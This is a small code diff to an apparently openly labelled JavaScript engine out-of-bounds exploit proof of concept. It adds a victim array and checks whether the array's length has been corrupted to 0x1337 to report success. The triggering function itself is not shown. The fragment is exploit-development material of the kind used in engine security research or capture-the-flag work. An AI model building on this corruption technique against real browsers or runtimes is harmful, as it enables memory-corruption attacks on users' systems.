@@ -56,6 +56,7 @@ function hax(arr, n) {
 }
 
 var arr = [1,2,3,4,5,6,7,8,9,10]; 
+var tar = [1,2,3,4,5,6,7,8,9,10];
 for (let i = 1; i <= 10000; i++) {
     let n = -4;
     if (i == 10000) {
@@ -63,4 +64,10 @@ for (let i = 1; i <= 10000; i++) {
     }
     hax(arr, n);
 }
-console.log("Done OutOfBounds1 exploit.\n");
+
+if (tar.length == 0x1337) {
+    console.log("Exploit Successful\n");
+}
+else {
+    console.log("Exploit Failed\n");
+}
